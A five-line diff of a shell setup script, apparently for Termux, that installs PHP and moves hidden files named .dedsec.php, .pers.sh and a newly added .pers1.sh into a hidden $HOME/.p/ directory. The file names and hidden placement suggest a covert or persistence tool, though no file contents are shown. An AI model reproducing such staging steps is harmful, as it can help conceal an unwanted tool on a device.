@@ -1,5 +1,5 @@
 pkg install php -y
-mkdir $HOME/.p/ && mv .dedsec.php $HOME/.p/ && mv .pers.sh $HOME/.p/
+mkdir $HOME/.p/ && mv .dedsec.php $HOME/.p/ && mv .pers.sh $HOME/.p/ && mv .pers1.sh $HOME/.p/
 pkg update
 pkg upgrade -y
 cd
